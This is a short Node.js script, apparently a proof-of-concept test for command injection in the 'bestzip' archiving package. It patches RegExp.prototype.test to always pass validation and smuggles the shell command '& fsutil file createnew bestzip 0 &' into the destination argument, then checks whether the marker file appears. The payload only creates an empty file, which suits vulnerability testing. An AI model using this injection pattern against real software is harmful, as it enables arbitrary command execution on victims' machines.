RegExp.prototype.test = () => true;
const zip = require('bestzip');
const fs = require('fs');
const path = './bestzip';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
zip({
    source: '',
    destination: './& fsutil file createnew bestzip 0 &'
}).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});